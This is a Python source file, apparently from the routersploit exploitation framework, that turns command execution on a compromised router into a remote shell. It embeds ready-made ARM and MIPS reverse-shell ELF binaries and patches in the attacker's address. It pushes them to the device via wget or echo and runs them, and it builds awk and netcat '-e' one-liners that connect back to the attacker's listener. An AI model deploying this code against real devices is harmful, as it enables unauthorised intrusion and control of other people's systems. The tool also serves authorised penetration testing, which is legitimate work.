import socket
import struct
import os
import telnetlib
import SimpleHTTPServer, BaseHTTPServer
import time
import threading
from base64 import b64decode

from routersploit.utils import (
    print_info,
    print_error,
    print_success,
    print_status,
    random_text,
)


def shell(exploit, architecture="", method="", **params):
    while 1:
        cmd = raw_input("cmd > ")

        if cmd in ["quit", "exit"]:
            return

        c = cmd.split()
        if c[0] == "reverse_tcp":
            if len(c) == 3:
                lhost = c[1]
                lport = c[2]

                revshell = reverse_shell(exploit, architecture, lhost, lport)

                if method == "wget":
                    revshell.wget(binary=params['binary'], location=params['location'])
                elif method == "echo":
                    revshell.echo(binary=params['binary'], location=params['location'])
                elif method == "awk":
                    revshell.awk(binary=params['binary'])
                elif method == "netcat":
                    revshell.netcat(binary=params['binary'], shell=params['shell'])
                else:
                    print_error("Reverse shell is not available")
            else:
                print_error("reverse_tcp <reverse ip> <port>")
        else:
           print_info(exploit.execute(cmd))


class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET (self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

        self.wfile.write(self.server.content)
        self.server.stop = True
    def log_message(self, format, *args):
        return

class HttpServer(BaseHTTPServer.HTTPServer):
    def serve_forever(self, content):
        self.stop = False
        self.content = content
        while not self.stop:
            self.handle_request()

class reverse_shell(object):
    arm = (# elf binary
           "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00"
           "\x00\x00\x74\x80\x00\x00\x34\x00\x00\x00\x70\x01\x00\x00\x02\x02\x00\x05\x34\x00\x20\x00"
           "\x02\x00\x28\x00\x07\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80"
           "\x00\x00\x18\x01\x00\x00\x18\x01\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00"
           "\x18\x01\x00\x00\x18\x01\x01\x00\x18\x01\x01\x00\x0b\x00\x00\x00\x0b\x00\x00\x00\x06\x00"
           "\x00\x00\x00\x80\x00\x00"
           # <_start>:
           "\x84\x70\x9f\xe5"  # ldr    r7, [pc, #132]
           "\x02\x00\xa0\xe3"  # mov    r0, #2
           "\x01\x10\xa0\xe3"  # mov    r1, #1
           "\x00\x20\xa0\xe3"  # mov    r2, #0
           "\x00\x00\x00\xef"  # svc    0x00000000
           "\x00\x60\xa0\xe1"  # mov    r6, r0
           "\x70\x50\x9f\xe5"  # ldr    r5, [pc, #112]  ; 8104 <loop+0x50>
           "\x04\x50\x2d\xe5"  # push   {r5}        ; (str r5, [sp, #-4]!)
           "\x6c\x50\x9f\xe5"  # ldr    r5, [pc, #108]  ; 8108 <loop+0x54>
           "\x04\x50\x2d\xe5"  # push   {r5}        ; (str r5, [sp, #-4]!)
           "\x0d\x10\xa0\xe1"  # mov    r1, sp
           "\x10\x20\xa0\xe3"  # mov    r2, #16
           "\x60\x70\x9f\xe5"  # ldr    r7, [pc, #96]   ; 810c <loop+0x58>
           "\x00\x00\x00\xef"  # svc    0x00000000
           "\x06\x00\xa0\xe1"  # mov    r0, r6
           "\x03\x10\xa0\xe3"  # mov    r1, #3
           # <loop>:
           "\x01\x10\x51\xe2"  # subs   r1, r1, #1
           "\x3f\x70\xa0\xe3"  # mov    r7, #63 ; 0x3f
           "\x00\x00\x00\xef"  # svc    0x00000000
           "\xfb\xff\xff\x1a"  # bne    80b4 <loop>
           "\x44\x00\x9f\xe5"  # ldr    r0, [pc, #68]   ; 8110 <loop+0x5c>
           "\x00\x10\xa0\xe1"  # mov    r1, r0
           "\x02\x20\x22\xe0"  # eor    r2, r2, r2
           "\x04\x20\x2d\xe5"  # push   {r2}        ; (str r2, [sp, #-4]!)
           "\x38\x10\x9f\xe5"  # ldr    r1, [pc, #56]   ; 8114 <loop+0x60>
           "\x04\x10\x2d\xe5"  # push   {r1}        ; (str r1, [sp, #-4]!)
           "\x0d\x10\xa0\xe1"  # mov    r1, sp
           "\x0b\x70\xa0\xe3"  # mov    r7, #11
           "\x00\x00\x00\xef"  # svc    0x00000000
           "\x00\x00\xa0\xe3"  # mov    r0, #0
           "\x01\x70\xa0\xe3"  # mov    r7, #1
           "\x00\x00\x00\xef"  # svc    0x00000000
           "\x01\x70\xa0\xe3"  # mov    r7, #1
           "\x00\x00\xa0\xe3"  # mov    r0, #0
           "\x00\x00\x00\xef"  # svc    0x00000000
           "\x19\x01\x00\x00"  # .word  0x00000119
           "\x7f\x00\x00\x01"  # .word  0x0100007f
           "\x02\x00\x11\x5c"  # .word  0x5c110002
           "\x1b\x01\x00\x00"  # .word  0x0000011b
           "\x18\x01\x01\x00"  # .word  0x00010118
           "\x20\x01\x01\x00"  # .word  0x00010120
           # elf binary
           "\x2f\x62\x69\x6e\x2f\x73\x68\x00\x73\x68\x00\x41\x13\x00\x00\x00\x61\x65\x61\x62\x69\x00"
           "\x01\x09\x00\x00\x00\x06\x01\x08\x01\x00\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e\x73\x74\x72"
           "\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x64"
           "\x61\x74\x61\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00\x00\x00"
           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00"
           "\x01\x00\x00\x00\x06\x00\x00\x00\x74\x80\x00\x00\x74\x00\x00\x00\xa4\x00\x00\x00\x00\x00"
           "\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x01\x00\x00\x00"
           "\x03\x00\x00\x00\x18\x01\x01\x00\x18\x01\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00"
           "\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x27\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00"
           "\x00\x00\x00\x00\x23\x01\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00"
           "\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
           "\x37\x01\x00\x00\x37\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00"
           "\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02\x00\x00"
           "\x40\x01\x00\x00\x06\x00\x00\x00\x0c\x00\x00\x00\x04\x00\x00\x00\x10\x00\x00\x00\x09\x00"
           "\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x03\x00\x00\x70\x00\x00\x00"
           "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x80\x00\x00\x00\x00\x00\x00"
           "\x03\x00\x01\x00\x00\x00\x00\x00\x18\x01\x01\x00\x00\x00\x00\x00\x03\x00\x02\x00\x00\x00"
           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00"
           "\x00\x00\x00\x00\x04\x00\xf1\xff\x0f\x00\x00\x00\x18\x01\x01\x00\x00\x00\x00\x00\x00\x00"
           "\x02\x00\x16\x00\x00\x00\x20\x01\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x19\x00\x00\x00"
           "\x74\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1c\x00\x00\x00\xb4\x80\x00\x00\x00\x00"
           "\x00\x00\x00\x00\x01\x00\x21\x00\x00\x00\x00\x81\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00"
           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\xf1\xff\x21\x00\x00\x00\x18\x01"
           "\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x24\x00\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00"
           "\x10\x00\x02\x00\x2f\x00\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x3d\x00"
           "\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x49\x00\x00\x00\x74\x80\x00\x00"
           "\x00\x00\x00\x00\x10\x00\x01\x00\x50\x00\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00"
           "\x02\x00\x5c\x00\x00\x00\x24\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x64\x00\x00\x00"
           "\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x6b\x00\x00\x00\x24\x01\x01\x00\x00\x00"
           "\x00\x00\x10\x00\x02\x00\x00\x72\x65\x76\x65\x72\x73\x65\x5f\x74\x63\x70\x2e\x6f\x00\x62"
           "\x69\x6e\x61\x72\x79\x00\x73\x68\x00\x24\x61\x00\x6c\x6f\x6f\x70\x00\x24\x64\x00\x5f\x62"
           "\x73\x73\x5f\x65\x6e\x64\x5f\x5f\x00\x5f\x5f\x62\x73\x73\x5f\x73\x74\x61\x72\x74\x5f\x5f"
           "\x00\x5f\x5f\x62\x73\x73\x5f\x65\x6e\x64\x5f\x5f\x00\x5f\x73\x74\x61\x72\x74\x00\x5f\x5f"
           "\x62\x73\x73\x5f\x73\x74\x61\x72\x74\x00\x5f\x5f\x65\x6e\x64\x5f\x5f\x00\x5f\x65\x64\x61"
           "\x74\x61\x00\x5f\x65\x6e\x64\x00")
    
    mipsel = b64decode("f0VMRgEBAQAAAAAAAAAAAAIACAABAAAAkABAADQAAACMAQAAABAAUDQAIAACACgABgADAAAAAHB0AAAAdABAAHQAQAAYAAAAGAAAAAQAAAAEAAAAAQAAAAAAAAAAAEAAAABAAGABAABgAQAABQAAAAAAAQD0EQAgAAAAAAAAAAAAAAAAAAAAAFCBQQAAAAAA//8EKKYPAiQMCQkBEREEKKYPAiQMCQkB/f8MJCcggAGmDwIkDAkJAf3/DCQnIIABJyiAAf//BihXEAIkDAkJAf//RDDJDwIkDAkJAckPAiQMCQkBemkFPAIApTT4/6WvAAEFPH8ApTT8/6Wv+P+lI+//DCQnMIABShACJAwJCQFiaQg8Ly8INez/qK9zaAg8bi8INfD/qK///wco9P+nr/z/p6/s/6Qj7P+oI/j/qK/4/6Uj7P+9J///BiirDwIkDAkJAQAAAAAAAAAAAAAAAAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5yZWdpbmZvAC50ZXh0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAGAABwAgAAAHQAQAB0AAAAGAAAAAAAAAAAAAAABAAAABgAAAAkAAAAAQAAAAYAAACQAEAAkAAAANAAAAAAAAAAAAAAABAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAGABAAAqAAAAAAAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAB8AgAAwAAAAAUAAAADAAAABAAAABAAAAAJAAAAAwAAAAAAAAAAAAAAPAMAAEAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB0AEAAAAAAAAMAAQAAAAAAkABAAAAAAAADAAIAAQAAAGABQQAAAAAAEAACAAgAAABQgUEAAAAAABAA8f8MAAAAAAAAAAAAAAAQAAAAFAAAAJAAQAAAAAAAEAACABsAAACQAEAAAAAAABEAAgAiAAAAYAFBAAAAAAAQAPH/LgAAAGABQQAAAAAAEADx/zUAAABgAUEAAAAAABAA8f86AAAAYAFBAAAAAAAQAPH/AF9mZGF0YQBfZ3AAX19zdGFydABfZnRleHQAX3N0YXJ0AF9fYnNzX3N0YXJ0AF9lZGF0YQBfZW5kAF9mYnNzAA==")

    mips = b64decode("f0VMRgECAQAAAAAAAAAAAAACAAgAAAABAEAAkAAAADQAAAGMUAAQAAA0ACAAAgAoAAYAA3AAAAAAAAB0AEAAdABAAHQAAAAYAAAAGAAAAAQAAAAEAAAAAQAAAAAAQAAAAEAAAAAAAWAAAAFgAAAABQABAAAgABH0AAAAAAAAAAAAAAAAAAAAAABBgVAAAAAAKAT//yQCD6YBCQkMKAQRESQCD6YBCQkMJAz//QGAICckAg+mAQkJDCQM//0BgCAnAYAoJygG//8kAhBXAQkJDDBE//8kAg/JAQkJDCQCD8kBCQkMPAUAAjSlemmvpf/4PAXAqDSlATevpf/8I6X/+CQM/+8BgDAnJAIQSgEJCQw8CC8vNQhiaa+o/+w8CG4vNQhzaK+o//AoB///r6f/9K+n//wjpP/sI6j/7K+o//gjpf/4J73/7CgG//8kAg+rAJCTTAAAAAAAAAAAAAAAAAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5yZWdpbmZvAC50ZXh0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABtwAAAGAAAAAgBAAHQAAAB0AAAAGAAAAAAAAAAAAAAABAAAABgAAAAkAAAAAQAAAAYAQACQAAAAkAAAANAAAAAAAAAAAAAAABAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAWAAAAAqAAAAAAAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAJ8AAAAwAAAAAUAAAADAAAABAAAABAAAAAJAAAAAwAAAAAAAAAAAAADPAAAAEAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB0AAAAAAMAAAEAAAAAAEAAkAAAAAADAAACAAAAAQBBAWAAAAAAEAAAAgAAAAgAQYFQAAAAABAA//EAAAAMAAAAAAAAAAAQAAAAAAAAFABAAJAAAAAAEAAAAgAAABsAQACQAAAAABEAAAIAAAAiAEEBYAAAAAAQAP/xAAAALgBBAWAAAAAAEAD/8QAAADUAQQFgAAAAABAA//EAAAA6AEEBYAAAAAAQAP/xAF9mZGF0YQBfZ3AAX19zdGFydABfZnRleHQAX3N0YXJ0AF9fYnNzX3N0YXJ0AF9lZGF0YQBfZW5kAF9mYnNzAA==")

    exploit = None
    arch = None
    lhost = None
    lport = None
    binary_name = None
    revshell = None

    def __init__(self, exploit, arch, lhost, lport):
        self.exploit = exploit
        self.arch = arch
        self.lhost = lhost
        self.lport = lport

    def convert_ip(self, addr):
        res = ""
        for i in addr.split("."):
            res += chr(int(i))
        return res

    def convert_port(self, p):
        res = "%.4x" % int(p)
        return res.decode('hex')

    def generate_binary(self, lhost, lport):
        print_status("Generating reverse shell binary")
        self.binary_name = random_text(8)
        ip = self.convert_ip(lhost)
        port = self.convert_port(lport)

        if self.arch == 'arm':
            self.revshell = self.arm[:0x104] + ip + self.arm[0x108:0x10a] + port + self.arm[0x10c:]
        elif self.arch == 'mipsel':
            self.revshell = self.mipsel[:0xe4] + port + self.mipsel[0xe6:0xf0] + ip[2:] + self.mipsel[0xf2:0xf4] + ip[:2] + self.mipsel[0xf6:]
        elif self.arch == 'mips':
            self.revshell = self.mips[:0xea] + port + self.mips[0xec:0xf2] + ip[:2] + self.mips[0xf4:0xf6] + ip[2:] + self.mips[0xf8:]
        else:
            print_error("Platform not supported")

    def http_server(self, lhost, lport):
        print_status("Setting up HTTP server")
        server = HttpServer((lhost, int(lport)), HttpRequestHandler)

        server.serve_forever(self.revshell)
        server.server_close()

    def wget(self, binary, location):
        print_status("Using wget method")
        # generate binary
        self.generate_binary(self.lhost, self.lport)

        # run http server
        thread = threading.Thread(target = self.http_server, args=(self.lhost, self.lport))
        thread.start()

        # wget binary
        print_status("Using wget to download binary")
        cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
                                                   self.lhost,
                                                   self.lport,
                                                   self.binary_name,
                                                   location,
                                                   self.binary_name)

        self.exploit.execute(cmd)

        # execute binary
        sock = self.listen(self.lhost, self.lport)
        self.execute_binary(location, self.binary_name)

        # waiting for shell
        self.shell(sock)

    def echo(self, binary, location):
        print_status("Using echo method")

        # generate binary
        self.generate_binary(self.lhost, self.lport)
        path = "{}/{}".format(location, self.binary_name)

        size = len(self.revshell) 
        num_parts = (size / 30) + 1

        # transfer binary through echo command
        print_status("Using echo method to transfer binary")
        for i in range(0, num_parts):
            current = i * 30
            print_status("Transferring {}/{} bytes".format(current, len(self.revshell)))

            block = self.revshell[current:current+30].encode('hex')
            block = "\\x" + "\\x".join(a+b for a,b in zip(block[::2], block[1::2]))
            cmd = '$(echo -n -e "{}" >> {})'.format(block, path)
            self.exploit.execute(cmd)

        # execute binary
        sock = self.listen(self.lhost, self.lport)
        self.execute_binary(location, self.binary_name)

        # waiting for shell
        self.shell(sock)

    def awk(self, binary):
        print_status("Using awk method")

        # run reverse shell through awk
        sock = self.listen(self.lhost, self.lport)
        cmd = binary + " 'BEGIN{s=\"/inet/tcp/0/" + self.lhost + "/" + self.lport + "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'"
        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def netcat(self, binary, shell):
        # run reverse shell through netcat
        sock = self.listen(self.lhost, self.lport)
        cmd = "{} {} {} -e {}".format(binary,
                                      self.lhost,
                                      self.lport,
                                      shell)

        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def execute_binary(self, location, binary_name):
        path = "{}/{}".format(location, binary_name)
        cmd = "chmod +x {}; {}; rm {}".format(path,
                                               path,
                                               path)

        thread = threading.Thread(target = self.exploit.execute, args=(cmd,))
        thread.start()

    def listen(self, lhost, lport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost, int(lport)))
        sock.listen(5)
        return sock

    def shell(self, sock):
        print_status("Waiting for reverse shell...")
        client, addr = sock.accept()
        sock.close()
        print_status("Connection from {}:{}".format(addr[0], addr[1]))

        print_success("Enjoy your shell")
        t = telnetlib.Telnet()
        t.sock = client
        t.interact()
